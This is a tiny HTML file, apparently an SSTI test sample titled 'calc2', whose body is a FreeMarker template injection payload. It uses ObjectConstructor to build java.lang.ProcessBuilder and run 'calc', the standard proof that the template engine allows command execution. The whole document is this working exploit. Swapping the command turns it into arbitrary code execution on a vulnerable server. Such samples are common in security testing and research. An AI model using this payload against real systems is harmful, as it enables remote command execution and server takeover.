<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>calc2</title>
</head>
<body>

弹计算器2：<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
${value("java.lang.ProcessBuilder","calc").start()}


</body>
</html>